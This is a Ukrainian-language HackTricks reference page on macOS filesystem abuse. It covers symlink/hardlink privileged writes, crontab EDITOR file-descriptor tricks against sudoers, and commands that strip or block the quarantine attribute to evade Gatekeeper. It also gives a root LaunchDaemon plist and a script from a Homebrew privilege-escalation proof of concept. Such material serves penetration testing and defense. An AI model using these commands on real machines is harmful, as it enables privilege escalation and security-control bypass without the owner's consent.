# macOS FS Tricks

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію рекламовану на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв на GitHub**.

</details>

## Комбінації дозволів POSIX

Дозволи в **каталозі**:

* **читання** - ви можете **перелічити** записи каталогу
* **запис** - ви можете **видаляти/записувати** **файли** в каталозі та **видаляти порожні папки**.
* Але ви **не можете видаляти/змінювати непорожні папки**, якщо у вас немає дозволів на запис до них.
* Ви **не можете змінювати назву папки**, якщо ви не є її власником.
* **виконання** - вам **дозволено переходити** в каталог - якщо у вас немає цього права, ви не зможете отримати доступ до будь-яких файлів всередині нього або в будь-яких підкаталогах.

### Небезпечні комбінації

**Як перезаписати файл/папку, яка належить root**, але:

* Один батьківський **власник каталогу** в шляху - користувач
* Один батьківський **власник каталогу** в шляху - **група користувачів** з **доступом на запис**
* Група користувачів має **доступ на запис** до **файлу**

З будь-якою з попередніх комбінацій атакувальник може **впровадити** **символьне/жорстке посилання** на очікуваний шлях, щоб отримати привілейоване довільне записування.

### Випадок спеціального доступу R+X для кореня каталогу

Якщо є файли в **каталозі**, де **тільки root має доступ R+X**, вони **недоступні для будь-кого іншого**. Тому вразливість, яка дозволяє **перемістити файл, доступний для читання користувачем**, який не може читати через це **обмеження**, з цього каталогу **в інший**, може бути використана для читання цих файлів.

Приклад у: [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## Символьне посилання / Жорстке посилання

Якщо привілейований процес записує дані в **файл**, який може бути **контрольований** менш привілейованим користувачем або який може бути **раніше створений** менш привілейованим користувачем. Користувач може просто **вказати на інший файл** через символьне або жорстке посилання, і привілейований процес буде записувати в цей файл.

Перевірте інші розділи, де атакувальник може **використовувати довільне записування для підвищення привілеїв**.

## .fileloc

Файли з розширенням **`.fileloc`** можуть вказувати на інші програми або бінарні файли, тому коли вони відкриваються, виконуватиметься ця програма/бінарний файл.\
Приклад:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Довільний FD

Якщо ви можете змусити **процес відкрити файл або папку з високими привілеями**, ви можете зловживати **`crontab`**, щоб відкрити файл у `/etc/sudoers.d` з **`EDITOR=exploit.py`**, тоді `exploit.py` отримає FD до файлу всередині `/etc/sudoers` і зловживає ним.

Наприклад: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## Уникайте трюків з атрибутами xattrs карантину

### Видаліть це
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### Прапорець uchg / uchange / uimmutable

Якщо у файлу/папці встановлено цей незмінний атрибут, то неможливо буде додати до нього xattr.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### Монтування defvfs

Монтування **devfs** **не підтримує xattr**, додаткова інформація в [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

Цей ACL запобігає додаванню `xattrs` до файлу
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

Формат файлу **AppleDouble** копіює файл разом з його ACEs.

У [**вихідному коді**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) можна побачити, що текстове представлення ACL, збережене всередині xattr під назвою **`com.apple.acl.text`**, буде встановлено як ACL у розпакованому файлі. Таким чином, якщо ви стиснули додаток у zip-файл з форматом файлу **AppleDouble** з ACL, яке перешкоджає запису інших xattr до нього... xattr карантину не було встановлено у додаток:

Перевірте [**оригінальний звіт**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) для отримання додаткової інформації.

Для реплікації цього спочатку нам потрібно отримати правильний рядок acl:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Зверніть увагу, що навіть якщо це працює, після цього пісочниця записує атрибут quarantine)

Не зовсім потрібно, але я залишаю це тут на всякий випадок:

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## Обхід підписів коду

Пакунки містять файл **`_CodeSignature/CodeResources`**, який містить **хеш** кожного окремого **файлу** у **пакунку**. Зверніть увагу, що хеш CodeResources також **вбудований у виконуваний файл**, тому ми не можемо з цим порушувати.

Однак є деякі файли, підпис яких не буде перевірений, вони мають ключ omit у plist, наприклад:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Можливо обчислити підпис ресурсу з командного рядка за допомогою:

{% code overflow="wrap" %}
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Монтування dmg-файлів

Користувач може монтувати власний dmg-файл, створений навіть поверх деяких існуючих папок. Ось як ви можете створити власний dmg-пакет із власним вмістом:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
{% endcode %}

Зазвичай macOS монтує диск, спілкуючись з службою Mach `com.apple.DiskArbitrarion.diskarbitrariond` (наданою `/usr/libexec/diskarbitrationd`). Якщо додати параметр `-d` до файлу LaunchDaemons plist та перезапустити його, він буде зберігати журнали в `/var/log/diskarbitrationd.log`.\
Однак можна використовувати інструменти, такі як `hdik` та `hdiutil`, щоб спілкуватися безпосередньо з `com.apple.driver.DiskImages` kext.

## Довільні записи

### Періодичні sh-сценарії

Якщо ваш сценарій можна розглядати як **shell-сценарій**, ви можете перезаписати **`/etc/periodic/daily/999.local`** shell-сценарій, який буде запускатися щодня.

Ви можете **підробити** виконання цього сценарію за допомогою: **`sudo periodic daily`**

### Демони

Запишіть довільний **LaunchDaemon**, наприклад **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** з plist, що виконує довільний сценарій, наприклад:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Просто створіть сценарій `/Applications/Scripts/privesc.sh` з **командами**, які ви хочете виконати як root.

### Файл Sudoers

Якщо у вас є **довільна можливість запису**, ви можете створити файл всередині папки **`/etc/sudoers.d/`**, що надасть вам **sudo** привілеї.

### Файли шляхів

Файл **`/etc/paths`** є одним з основних місць, які заповнюють змінну середовища PATH. Вам потрібно мати права root для його перезапису, але якщо сценарій з **привілейованим процесом** виконує деяку **команду без повного шляху**, ви можете **перехопити** його, змінивши цей файл.

Ви також можете записувати файли в **`/etc/paths.d`**, щоб завантажувати нові теки в змінну середовища `PATH`.

## Створення записуваних файлів від інших користувачів

Це створить файл, який належить користувачу root і доступний для запису мені ([**код звідси**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew\_lpe.sh)). Це також може працювати як підвищення привілеїв:
```bash
DIRNAME=/usr/local/etc/periodic/daily

mkdir -p "$DIRNAME"
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"

MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername

FILENAME=$(ls "$DIRNAME")
echo $FILENAME
```
## Посилання

* [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію рекламовану на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний мерч PEASS & HackTricks**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв GitHub.

</details>
